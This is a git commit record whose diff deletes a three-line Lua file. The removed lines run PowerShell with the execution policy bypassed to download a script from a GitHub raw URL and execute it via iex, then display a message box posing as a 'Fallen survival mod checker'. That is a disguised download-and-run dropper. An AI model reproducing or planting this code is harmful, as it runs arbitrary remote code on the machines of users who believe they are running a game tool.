693201abdb24edd33cd991a3425a418cfd4fada9
monkeyadece <118022576+monkeyadece@users.noreply.github.com>
2025-02-21 22:35:14 -0500

    Delete ewqewv1.lua

--- ewqewv1.lua
+++
@@ -1,3 +0,0 @@
-os.execute('powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/monkeyadece/teste/refs/heads/main/ewqeq | iex"')
-messagebox("Enabled: True | Made by monkeyadece", " Fallen survival mod checker",  48)
--- Made by monkey |2/21/2025| --
